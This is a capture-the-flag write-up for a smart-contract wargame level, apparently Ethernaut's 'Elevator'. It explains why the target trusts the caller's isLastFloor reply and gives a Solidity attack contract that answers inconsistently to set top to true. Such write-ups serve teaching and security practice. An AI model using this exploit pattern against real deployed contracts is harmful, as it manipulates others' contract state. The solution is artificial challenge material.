### Goals

Reach the top of the building - set top to true

### Exploit

The contract has one function that allows user to go to certain floor as provided in param. It assumes the sender has implemented `isLastFloor` function which is being called on him and checked if the floor is last one.

We need to write evil smart contract that will return return different boolean value for `isLastFloor` call based on some conditions, so we can set the `Elevator::top()` to true. We will use a flag for this purpose.

### Code

Let's deploy following contract with Remix

```code
contract Top {
    address target;

    bool public flag = false;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint) external returns(bool) {
      if(!flag) {
        flag = true;
        return false;
      }
      return true;
    }

    function pwn() external {
        target.call(abi.encodeWithSignature("goTo(uint256)", 1));
    }
}
```

Now just call `pwn()` and ...
Done!
